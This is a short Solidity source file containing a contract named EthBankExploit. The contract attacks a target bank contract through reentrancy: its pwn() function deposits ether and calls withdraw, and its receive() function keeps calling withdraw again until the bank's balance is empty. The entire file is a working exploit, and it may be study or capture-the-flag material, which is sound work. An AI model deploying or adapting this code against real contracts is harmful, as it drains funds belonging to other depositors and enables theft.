// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IEthBank {
    function deposit() external payable;

    function withdraw() external payable;
}

contract EthBankExploit {
    IEthBank public bank;

    constructor(IEthBank _bank) {
        bank = _bank;
    }

    function pwn() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
    
    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}